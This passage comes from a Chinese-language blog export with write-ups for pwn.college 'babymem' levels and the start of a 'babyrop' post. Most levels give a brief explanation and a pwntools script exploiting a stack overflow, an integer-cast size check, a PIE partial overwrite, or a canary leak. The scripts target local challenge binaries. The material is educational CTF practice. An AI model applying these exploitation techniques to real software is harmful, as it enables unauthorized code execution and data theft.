class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./babymem_level4.0&quot;)</span></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level4.0&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pad = 0x401B5 #0x30</span></span><br><span class=\"line\">win_addr = <span class=\"number\">0x401B88</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">40</span>+ p64(win_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;-999&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​        </p>\n<h4 id=\"Level4-1\"><a href=\"#Level4-1\" class=\"headerlink\" title=\"Level4.1\"></a>Level4.1</h4><p>​        漏洞点：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( (<span class=\"keyword\">signed</span> <span class=\"keyword\">int</span>)v5 &gt; <span class=\"number\">30</span> )</span><br></pre></td></tr></table></figure>\n\n<p>​        依然是利用强制类型转换将本来是uint的v5变成int来与30比较，形成整数溢出。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./babymem_level4.1&quot;)</span></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level4.1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pad = 0x401B5 #0x30</span></span><br><span class=\"line\">win_addr = <span class=\"number\">0x4016A3</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">56</span>+ p64(win_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;-999&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"Level5-0\"><a href=\"#Level5-0\" class=\"headerlink\" title=\"Level5.0\"></a>Level5.0</h4><p>​        这个题依然是在输入size的地方进行了一定的检测，这里是</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( v31 * v32 &gt; <span class=\"number\">7</span> )</span><br><span class=\"line\">    sub_401150(<span class=\"string\">&quot;record_size * record_num &lt; (unsigned int) sizeof(input)&quot;</span>, <span class=\"string\">&quot;&lt;stdin&gt;&quot;</span>, <span class=\"number\">143LL</span>, <span class=\"string\">&quot;challenge&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>​    </p>\n<p>​        然后虽然可以输入负数，但是如果随便输的话会导致溢出到下一个payload的read的buffer，导致输入不了，程序直接爆炸。真的非常逆天。        </p>\n<p>​        4294967297是1，</p>\n<p>​        18446744073709551617</p>\n<p>2147483649</p>\n<p>​        去找了一下官方的teaching，发现思路其实并不是uint与int之间的强制类型转换，而是uint32和uint64之间强制类型转换导致的溢出。除了最后的size计算时，将v33转化成uint64，其他的变量都是uint32，<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%884.15.22.png\" alt=\"截屏2022-03-07 下午4.15.22\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level5.0&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">win = <span class=\"number\">0x4022E7</span></span><br><span class=\"line\"><span class=\"comment\">#payload = b&#x27;a&#x27;*40+b&quot;\\x48&quot;+ b&quot;a&quot;*2</span></span><br><span class=\"line\">payload =  <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">136</span> + p64(win)</span><br><span class=\"line\"><span class=\"comment\">#80+8 canary:16</span></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;2147483649&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h4 id=\"Level5-1\"><a href=\"#Level5-1\" class=\"headerlink\" title=\"Level5.1\"></a>Level5.1</h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level5.1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">win = <span class=\"number\">0x40173B</span></span><br><span class=\"line\"><span class=\"comment\">#payload = b&#x27;a&#x27;*40+b&quot;\\x48&quot;+ b&quot;a&quot;*2</span></span><br><span class=\"line\">payload =  <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">88</span> + p64(win)</span><br><span class=\"line\"><span class=\"comment\">#80+8 canary:16</span></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;2147483649&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;2&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"Level6-0\"><a href=\"#Level6-0\" class=\"headerlink\" title=\"Level6.0\"></a>Level6.0</h4><p>​        利用gadget的思想，直接将地址填成flag，而绕过win的检测。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./babymem_level5.0&quot;)</span></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level6.0&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"><span class=\"comment\">#pad = 0x401B5 #0x30</span></span><br><span class=\"line\">win_addr = <span class=\"number\">0x401693</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">152</span>+ p64(win_addr)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;160&quot;</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"Level6-1\"><a href=\"#Level6-1\" class=\"headerlink\" title=\"Level6.1\"></a>Level6.1</h4><p>​        同理。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./babymem_level6.1&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;/challenge/babymem_level6.1&quot;)</span></span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\"><span class=\"comment\">#pad = 0x401B5 #0x30</span></span><br><span class=\"line\">win_addr = <span class=\"number\">0x4013BA</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">152</span>+ p64(win_addr)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;160&quot;</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Level7-0\"><a href=\"#Level7-0\" class=\"headerlink\" title=\"Level7.0\"></a>Level7.0</h4><p>​        开始考pie的绕过了，不走寻常路啊。</p>\n<p>​        之前讲到pie的绕过，一般是部分覆写，以及脚本爆破。</p>\n<p>​        地址的后三个字符永远一致，所以只需爆破第四位，就能将<code>retn</code>覆盖成<code>win</code>    。</p>\n<p>​        （话说如此我其实从来没有写过爆破pie的脚本。。。。所以说为什么不走寻常路，别的题一般都是五花八门的glibc或者漏洞点，然后用pie增加难度。没有pie做不出来，有pie更加做不出来了，然而这个题目就纯纯地考pie，真的牛）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./babymem_level7.0&quot;)</span></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level7.0&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"><span class=\"comment\">#pad = 0x401B5 #0x30</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">136</span>+ <span class=\"string\">b&quot;\\xf4\\xbb&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;144&quot;</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>多执行，总会爆出来的，不过爆之前先在本地调一调，不然有什么错的地方就冤大头了。</p>\n<h4 id=\"Level7-1\"><a href=\"#Level7-1\" class=\"headerlink\" title=\"Level7.1\"></a>Level7.1</h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./babymem_level7.1&quot;)</span></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level8.0&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pad = 0x401B5 #0x30</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">152</span>+ <span class=\"string\">b&quot;\\xa4\\xb0&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;160&quot;</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​                </p>\n<h4 id=\"Level8-0\"><a href=\"#Level8-0\" class=\"headerlink\" title=\"Level8.0\"></a>Level8.0</h4><p>​        好像是又对输入size做了过滤。所以就用到另外一个trick，就是针对strlen的check可以用空字符绕过。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./babymem_level8.0&quot;)</span></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level8.0&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">152</span> + <span class=\"string\">b&quot;\\xa4\\xb0&quot;</span></span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;160&quot;</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>​        </p>\n<h4 id=\"Level8-1\"><a href=\"#Level8-1\" class=\"headerlink\" title=\"Level8.1\"></a>Level8.1</h4><p>​        同理</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./babymem_level8.1&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;/challenge/babymem_level8.1&quot;)</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;\\x00&#x27;</span>*<span class=\"number\">104</span> + <span class=\"string\">b&quot;\\x7e\\x79&quot;</span></span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;112&quot;</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Level9-0\"><a href=\"#Level9-0\" class=\"headerlink\" title=\"Level9.0\"></a>Level9.0</h4><p>​        以程序构造出的漏洞将输入写在canary后。这里需要写104个padding，同时72个padding加上<code>\\x60</code>直接绕到canary后覆写。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level9.1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">72</span>+<span class=\"string\">b&quot;\\x60&quot;</span>+ <span class=\"string\">b&quot;\\xbe\\xc5&quot;</span>*<span class=\"number\">6</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;106&quot;</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Level9-1\"><a href=\"#Level9-1\" class=\"headerlink\" title=\"Level9.1\"></a>Level9.1</h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-06%20%E4%B8%8B%E5%8D%889.00.44.png\" alt=\"截屏2022-03-06 下午9.00.44\">        </p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level9.1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">40</span>+<span class=\"string\">b&quot;\\x47&quot;</span>+ <span class=\"string\">b&quot;\\x26\\x46&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;77&quot;</span>)</span><br><span class=\"line\">p.recv()</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>​        n的数量和size都需要精准控制才能拿flag。</p>\n<h4 id=\"Level10-0\"><a href=\"#Level10-0\" class=\"headerlink\" title=\"Level10.0\"></a>Level10.0</h4><p>​        其实虽然盯着伪代码盯了很久但是感觉并没有实际理解这道题。目前我的疑惑有二：</p>\n<ol>\n<li>为什么flag被load进了内存，并且也给出了它在栈中实际的地址，但是栈上对应的地址显示的是0.</li>\n<li>这道题的思路应该是通过后面那个you say来打印flag，但是如何将payload的指针覆盖为flag的指针？    </li>\n</ol>\n<p>​    </p>\n<p>​        解答一下，第一个问题其实很不应该，显示为0就是因为没有权限。然后第二个问题，覆盖payload指针的思路至少不应该在这个module出现，这道题的漏洞点就是payload的区域和flag的区域在栈上是连续的，只要覆盖掉截断payload的输出的空字符就可以一直输出栈上的内容，包括flag。</p>\n<p>​        ps，包括其他题也是，如果有疑惑其实可以找一下官方的teaching视频（但是也有很多没有就是了）</p>\n<p>​        </p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level10.0&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload =  <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">111</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;150&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Level10-1\"><a href=\"#Level10-1\" class=\"headerlink\" title=\"Level10.1\"></a>Level10.1</h4><p>​        同</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level10.1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload =  <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">79</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;150&quot;</span>)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h4 id=\"Level11-0\"><a href=\"#Level11-0\" class=\"headerlink\" title=\"Level11.0\"></a>Level11.0</h4><p>​        也是类似的思路，但是这里倒不是栈地址了，不过区别不大，只是输入的payload大些。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level11.0&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#payload = b&#x27;a&#x27;*40+b&quot;\\x48&quot;+ b&quot;a&quot;*2</span></span><br><span class=\"line\">payload =  <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">24577</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;24600&quot;</span>)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"level11-1\"><a href=\"#level11-1\" class=\"headerlink\" title=\"level11.1\"></a>level11.1</h4><p>​        同理</p>\n<p>​    （ps：size是我随便填的。但是也不能太随便，得先<code>vmmap</code>看看flag和input buffer被映射到了哪里）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level11.1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload =  <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">12289</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;12400&quot;</span>)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"level12-0\"><a href=\"#level12-0\" class=\"headerlink\" title=\"level12.0\"></a>level12.0</h4><p>​        这道题的trick就在于可以反复调用函数<code>challenge</code>，每一次调用虽然栈会被clear但是canary不变，从而泄露canary。思路其实比较简单，但是调试有些令人恼火。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babymem_level12.0&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload1 =  <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">35</span>+<span class=\"string\">b&quot;REPEAT&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;41&quot;</span>)</span><br><span class=\"line\">p.send(payload1)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;You said:&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">canary = u64(p.recv()[<span class=\"number\">41</span>:<span class=\"number\">49</span>])</span><br><span class=\"line\">canary  -= <span class=\"number\">0x54</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">41</span> + p64(canary) + <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span> + <span class=\"string\">b&quot;\\x91\\xb0&quot;</span></span><br><span class=\"line\">p.send(<span class=\"string\">&#x27;100&#x27;</span>)</span><br><span class=\"line\">p.send(payload2)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"Level12-1\"><a href=\"#Level12-1\" class=\"headerlink\" title=\"Level12.1\"></a>Level12.1</h4><p>​    同理，但是需要好好调。 </p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;./babymem_level12.1&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload1 =  <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">83</span>+<span class=\"string\">b&quot;REPEAT&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">b&quot;89&quot;</span>)</span><br><span class=\"line\">gdb.attach(p)</span><br><span class=\"line\">p.send(payload1)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;You said:&#x27;</span>)</span><br><span class=\"line\">canary = u64(p.recv()[<span class=\"number\">89</span>:<span class=\"number\">97</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">canary  -= <span class=\"number\">0x54</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(canary))</span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">89</span> + p64(canary) + <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">8</span> + <span class=\"string\">b&quot;\\x63\\x18&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(<span class=\"string\">&#x27;112&#x27;</span>)</span><br><span class=\"line\">p.send(payload2)</span><br><span class=\"line\">pause()</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"level13-0\"><a href=\"#level13-0\" class=\"headerlink\" title=\"level13.0\"></a>level13.0</h4><p>​        。。输几个a就有flag，具体方法看13.1。</p>\n<h4 id=\"level13-1\"><a href=\"#level13-1\" class=\"headerlink\" title=\"level13.1\"></a>level13.1</h4><p>​        我觉得是最简单的level了。。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8B%E5%8D%882.35.04.png\" alt=\"截屏2022-03-10 下午2.35.04\"></p>\n<p>​        找到input buffer和flag间地址的填充量，填大于等于的a就行，数量没有必要精确。这个题脚本都没有写，实在太傻逼了。</p>\n<h4 id=\"level14\"><a href=\"#level14\" class=\"headerlink\" title=\"level14\"></a>level14</h4><p>​        其实我觉得这个题没有写的必要了，纯纯的就是13和12的结合。</p>\n<h4 id=\"level15-0\"><a href=\"#level15-0\" class=\"headerlink\" title=\"level15.0\"></a>level15.0</h4><p>​        一个奇怪的socket网络通信，我觉得思路是通过fork多个子进程来leak canary，但是由于从来没有接触过，所以先研究一会儿吧。</p>\n","categories":["PWN.COLLEGE"],"tags":["pwncollege"]},{"title":"ROP","url":"/2022/03/10/ROP/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-NkDACwlP\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<p>写在前面：如果是普通的环境，运行程序可能需要<code>capstone</code>，可以直接在官网下载源码编译，然后将编译好的动态链接库cp到lib里</p>\n<p><code> cp libcapstone.so.5 /lib/x86_64-linux-gnu/</code></p>\n<h4 id=\"Level1\"><a href=\"#Level1\" class=\"headerlink\" title=\"Level1\"></a>Level1</h4><p>​        最最最基础的rop了，和前前一个module的前面的有个level一模一样。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &quot;debug&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">&quot;/challenge/babyrop_level1.0&quot;</span>)</span><br><span class=\"line\">win = <span class=\"number\">0x401b56</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">104</span> + p64(win)</span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span 